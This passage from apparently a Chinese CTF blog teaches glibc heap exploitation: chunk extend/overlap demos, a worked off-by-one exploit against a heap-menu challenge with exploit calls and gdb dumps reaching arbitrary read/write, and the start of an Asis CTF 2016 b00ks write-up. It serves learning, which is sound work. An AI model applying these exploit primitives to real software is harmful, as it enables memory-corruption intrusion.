<h3 id="对-free-的-smallbin-进行-extend"><a href="#对-free-的-smallbin-进行-extend" class="headerlink" title="对 free 的 smallbin 进行 extend"></a>对 free 的 smallbin 进行 extend</h3><p>这个跟上面的也一样，只是其是在chunk1被正常free掉之后再去修改其size位，这样修改就不需要垫一个chunk，因为是free掉之后再改的size</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	<span class="comment">//chunk1</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr2 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);	<span class="comment">//chunk2</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(ptr1 - <span class="number">1</span>) = <span class="number">0xd1</span>;		<span class="comment">//修改free状态下的chunk1的size</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr3 = <span class="built_in">malloc</span>(<span class="number">0xc0</span>);	<span class="comment">//ptr3 == ptr1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="通过-extend-前向-overlapping"><a href="#通过-extend-前向-overlapping" class="headerlink" title="通过 extend 前向 overlapping"></a>通过 extend 前向 overlapping</h3><p>前面展示的都是后向合并（向高地址的chunk合并）</p>
<p>其实也可以通过修改当前chunk的prev size跟inuse位实现前向合并（向低地址的chunk合并），但是要满足unlink的条件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	<span class="comment">//chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);	<span class="comment">//中间包含的小块</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">size_t</span>* ptr2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);	<span class="comment">//chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);	<span class="comment">//垫一块</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(ptr2 - <span class="number">1</span>) = <span class="number">0x90</span>;		<span class="comment">//修改chunk2的size</span></span><br><span class="line">    *(ptr2 - <span class="number">2</span>) = <span class="number">0xf0</span>;		<span class="comment">//修改chunk2的prev size</span></span><br><span class="line">    <span class="built_in">free</span>(ptr2);		<span class="comment">//触发unlink实现前向合并</span></span><br><span class="line">    <span class="keyword">size_t</span>* ptr3 = <span class="built_in">malloc</span>(<span class="number">0x170</span>);	<span class="comment">//ptr3 == ptr1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中把chunk1 free掉是为了让其进入unsorted bin，从而使其fd跟bk指针的值能过unlink的检测，否则会报错。</p>
<h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><ol>
<li><p>prev size的复用问题：学基础知识的时候知道有这么个概念，到这里才比较理解。其实很简单，例如我们malloc一个0xn8（除了0x8，因为64位chunk最小对齐到0x20）的chunk，实际上我们只会得到一个数据段大小为0xn0的chunk，剩下的八个字节就用与其相邻的那个chunk的prev size位来存储。</p>
<p>例如我们<code>malloc(0x18)</code>，实际上得到的chunk大小为0x20，如下图，不够的八个字节用了top chunk的prev size来补</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x1192020</span><br><span class="line">0x1192020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1192030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1192040:	0x6161616161616161	0x0000000000020fc1</span><br></pre></td></tr></table></figure>

<p>这就有一个问题，比如当程序中存在off-by-one的时候，我们可以通过利用其复用prev size的特性，来让某一个chunk的数据区紧贴其下一个chunk的size位，这样我们就可以直接将下一个chunk的size的低一字节盖掉。</p>
</li>
<li><p>通过extend_overlopping利用fast bin来实现任意地址读写，具体在例题中说明。</p>
</li>
</ol>
<p>（libc-2.23下复现）</p>
<p>首先是常规菜单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;          Heap Creator          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Show a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Delete a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 5. Exit                        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体代码不贴了，简单说一下就行</p>
<p>在<code>1. Create a heap</code>功能函数中程序要求我们输入heap的size以及content，程序会先malloc一个0x10大小的chunk用来保存content的size和content chunk的指针（低位八个字节保存size，高位八个字节保存chunk指针），可以理解为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span>* content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且这个用来记录heap信息的chunk被保存到了.bss段上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(&amp;heaparray + i) = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br></pre></td></tr></table></figure>

<p>然后程序根据我们输入的size去<code>malloc(size);</code>，用这个chunk来保存content，并且我们输入的size无限制，create功能函数结束。</p>
<p>edit功能函数中存在off-by-one</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">read_input(*(*(&amp;heaparray + v1) + <span class="number">1</span>), **(&amp;heaparray + v1) + <span class="number">1LL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>show功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size : %ld\nContent : %s\n&quot;</span>, **(&amp;heaparray + v1), *(*(&amp;heaparray + v1) + <span class="number">1</span>));</span><br></pre></td></tr></table></figure>

<p>delete功能函数，可以看到不存在uaf漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*(*(&amp;heaparray + v1) + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">free</span>(*(&amp;heaparray + v1));</span><br><span class="line">  *(&amp;heaparray + v1) = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="通过extend-overlopping利用fast-bin来实现任意地址读写的详解"><a href="#通过extend-overlopping利用fast-bin来实现任意地址读写的详解" class="headerlink" title="通过extend_overlopping利用fast bin来实现任意地址读写的详解"></a>通过extend_overlopping利用fast bin来实现任意地址读写的详解</h4><p>这种先申请一个chunk去保存别的chunk的信息和指针的题目就老会有各种问题</p>
<p>我们想一想edit功能函数和show功能函数是根据什么去修改/查看堆内容的，显然是根据控制chunk中的size以及堆指针。那么如果我们能够修改这个控制chunk中的堆指针的话，我们不就能够利用edit和show功能函数去实现任意地址读写了吗？</p>
<p>那么如何实现呢？这里有一个思路就是extend_overlopping，我们让content chunk跟控制chunk重叠，使得控制chunk成为content chunk的一部分，而由于edit功能函数的存在，content chunk中的内容我们肯定是可以控制的，那么如果我们完成了这样的一个堆重叠的话，就可以修改控制chunk中的堆指针了，从而完成任意地址读写。</p>
<p>结合这一部分的exp详细演示一下吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x41&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>首先我们<code>malloc(0xn8);</code>，再<code>malloc(0x10);</code>，在例子中我malloc了0x18</p>
<p>我们先理一下在<code>1. Create a heap</code>功能函数中程序是如何申请堆块的：①程序先<code>malloc(0x10);</code>，这个chunk用来保存我们输入的size的值以及content chunk指针（我们把这个chunk称为控制chunk）。②程序接着<code>malloc(size);</code>，这个chunk用来保存content。</p>
<p>0xn8是因为我们得先让chunk间存在prev size的复用，然后我们才能够用off-by-one修改相邻chunk的size位</p>
<p>再申请一个0x10的chunk是为了得到一个跟控制chunk大小相同的chunk</p>
<p>此时堆长这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x12a6000</span><br><span class="line">0x12a6000:	0x0000000000000000	0x0000000000000021	=&gt;保存堆指针的chunk1</span><br><span class="line">0x12a6010:	0x0000000000000018	0x00000000012a6030</span><br><span class="line">0x12a6020:	0x0000000000000000	0x0000000000000021	=&gt;我们申请的0x18的chunk2</span><br><span class="line">0x12a6030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x12a6040:	0x6161616161616161	0x0000000000000021	=&gt;保存堆指针的chunk3</span><br><span class="line">0x12a6050:	0x0000000000000010	0x00000000012a6070</span><br><span class="line">0x12a6060:	0x0000000000000000	0x0000000000000021	=&gt;我们申请的0x10的chunk4</span><br><span class="line">0x12a6070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x12a6080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>

<p>为了方便叙述我们将以上几块chunk分别称作chunk1/2/3/4。</p>
<p>然后利用chunk2的off-by-one修改chunk3的大小，使其大小足以覆盖整个chunk4，这里我们将其修改成0x41</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x12a6000</span><br><span class="line">0x12a6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6010:	0x0000000000000018	0x00000000012a6030</span><br><span class="line">0x12a6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6030:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x12a6040:	0x6262626262626262	0x0000000000000041 =&gt;这里已经被修改</span><br><span class="line">0x12a6050:	0x0000000000000010	0x00000000012a6070</span><br><span class="line">0x12a6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x12a6080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>

<p>接下来用delete功能函数free掉chunk4，那么总共会free掉两个chunk：保存堆指针的chunk3以及保存内容的chunk4。但是由于chunk3的大小被我们修改成0x41，所以chunk3会进入到0x40的fast bin链中，chunk4正常进入0x20的fast bin链中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x12a6060 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x12a6040 ◂— 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>

<p>最后我们<code>malloc(0x30);</code>，那么我们就会得到一个0x20和一个0x40大小的chunk，这两个chunk从fast bin中取，并且0x20的chunk用作控制chunk，0x40的chunk用来保存content</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x12a6000</span><br><span class="line">0x12a6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6010:	0x0000000000000018	0x00000000012a6030</span><br><span class="line">0x12a6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12a6030:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x12a6040:	0x6262626262626262	0x0000000000000041 =&gt;这时这块0x40的chunk是content chunk</span><br><span class="line">0x12a6050:	0x0000000000000061	0x00000000012a6070</span><br><span class="line">0x12a6060:	0x0000000000000000	0x0000000000000021 =&gt;这块0x20的chunk是控制chunk</span><br><span class="line">0x12a6070:	0x0000000000000030	0x00000000012a6050</span><br><span class="line">0x12a6080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>

<p>到这里我们应该就能发现，我们最后得到的0x20的chunk是包含在0x40的chunk中的，我们就由此完成了通过堆重叠来修改堆指针的过程，那么我们只需要修改控制chunk中的指针，实现的就是任意地址读写的效果。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/05/%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/05/%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one/" class="post-title-link" itemprop="url">堆利用-off_by_one</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-05 18:01:07" itemprop="dateCreated datePublished" datetime="2022-05-05T18:01:07+08:00">2022-05-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-06 19:25:52" itemprop="dateModified" datetime="2022-05-06T19:25:52+08:00">2022-05-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="简述off-by-one"><a href="#简述off-by-one" class="headerlink" title="简述off_by_one"></a>简述off_by_one</h3><p>off_by_one指的就是一个字节的缓冲区溢出，常见的比如for循环中边界检查不当，还有strcpy函数在字符串尾部加上了一个结束符等等所造成的一个字节的溢出。</p>
<p>稍微特殊一点的情况就是单个NULL字节的溢出，比如上述的strcpy函数所造成的溢出就属于单个NULL字节的溢出，我们把这种特殊情况称为 NULL byte off-by-one 或者 off-by-NULL</p>
<h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">b00ks</a></h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>具有off-by-one漏洞的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">my_read</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, a1, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们仔细思考就会发现这个函数其实是不合理的（或者说是有问题的），比如我们传进该函数的长度为32，当我们输入完第32个字符的时候，a1实际指向了<code>传入的地址+32个字节</code>处， 这个地址实际上已经超出了传入的长度，最后<code>*a1 = 0</code>就造成了off-by-one</p>
<p>回到程序，在程序的开始首先会要求输入<code>author name</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !my_read(off_202018, <span class="number">32LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到这里<code>my_read</code>的第一个参数是<code>off_202018</code>，在ida中看一看这个地方的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202008 ; void *off_202008</span><br><span class="line">.data:0000000000202008 off_202008      dq offset off_202008    ; DATA XREF: sub_980+17↑r</span><br><span class="line">.data:0000000000202008                                         ; .data:off_202008↓o</span><br><span class="line">.data:0000000000202010 off_202010      dq offset unk_202060    ; DATA XREF: sub_B24:loc_B38↑o</span><br><span class="line">.data:0000000000202010                                         ; delete:loc_C1B↑o ...</span><br><span class="line">.data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: change_author+15↑o</span><br><span class="line">.data:0000000000202018                                         ; show+CA↑o</span><br></pre></td></tr></table></figure>

<p>可以看到<code>off_202018</code>的这个指针保存的是<code>unk_202040</code>的值，<code>unk_202040</code>其实就是与程序基址偏移为<code>0x202040</code>的地址，这个地址在<code>.bss</code>段中，所以我们输入的author name保存在了<code>unk_202040</code>这个地址里。</p>
<p>然后进入菜单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>在<code>Create a book</code>中要求输入book的名字（限制最长为32字节）跟内容（无长度限制），book的名字跟内容都分别申请了一个对应大小的chunk来储存，并且在最后申请了一个0x20大小的chunk来存储这个book的相关信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">book_struct = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);        <span class="comment">// 用一个0x20的chunk来保存book的相关信息</span></span><br><span class="line"><span class="keyword">if</span> ( book_struct )</span><br><span class="line">&#123;</span><br><span class="line">	*(book_struct + <span class="number">3</span>) = v1;			<span class="comment">//v1是content的大小</span></span><br><span class="line">	*(off_202010 + v2) = book_struct;	<span class="comment">//将指针保存到*(off_202010+v2)处</span></span><br><span class="line">	*(book_struct + <span class="number">2</span>) = content;		<span class="comment">//content是存储book的内容的chunk指针</span></span><br><span class="line">	*(book_struct + <span class="number">1</span>) = name;			<span class="comment">//name是存储book的名字的chunk指针</span></span><br><span class="line">	*book_struct = ++book_num;			<span class="comment">//*book_struct是该book对应的id</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里我们也要注意，<code>*(off_202010 + v2) = book_struct;</code>这条指令是将<code>book_struct</code>指针保存到<code>off_202010 </code>这个指针所指向的地址+v2个指针类型长度处（这里为v2个8字节），具体的可以从下面这段汇编看出来。（为什么要强调这个呢因为我个人基础不是很好所以写的时候复习一下）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000112E                 lea     rax, off_202010</span><br><span class="line">.text:0000000000001135                 mov     rax, [rax]</span><br><span class="line">.text:0000000000001138                 mov     edx, [rbp+v2]</span><br><span class="line">.text:000000000000113B                 movsxd  rdx, edx</span><br><span class="line">.text:000000000000113E                 shl     rdx, 3</span><br><span class="line">.text:0000000000001142                 add     rdx, rax</span><br><span class="line">.text:0000000000001145                 mov     rax, [rbp+book_struct]</span><br><span class="line">.text:0000000000001149                 mov     [rdx], rax</span><br></pre></td></tr></table></figure>

<p>delete函数正常释放<code>book_struct、content、name</code>指针，并且将<code>off_202010 + v2</code>上的指针置零，不存在uaf漏洞。</p>
<p>edit函数根据<code>book_struct</code>指针去修改book的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">......</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter new book description: &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !my_read(*(*(off_202010 + i) + <span class="number">16LL</span>), *(*(off_202010 + i) + <span class="number">24LL</span>) - <span class="number">1</span>) )</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>printf功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *(off_202010 + i);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;ID: %d\n&quot;</span>, **(off_202010 + i));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, *(*(off_202010 + i) + <span class="number">8LL</span>));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Description: %s\n&quot;</span>, *(*(off_202010 + i) + <span class="number">16LL</span>));</span><br><span class="line">      LODWORD(v0) = <span class="built_in">printf</span>(<span class="string">&quot;Author: %s\n&quot;</span>, off_202018);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后一个修改author name的功能</p>
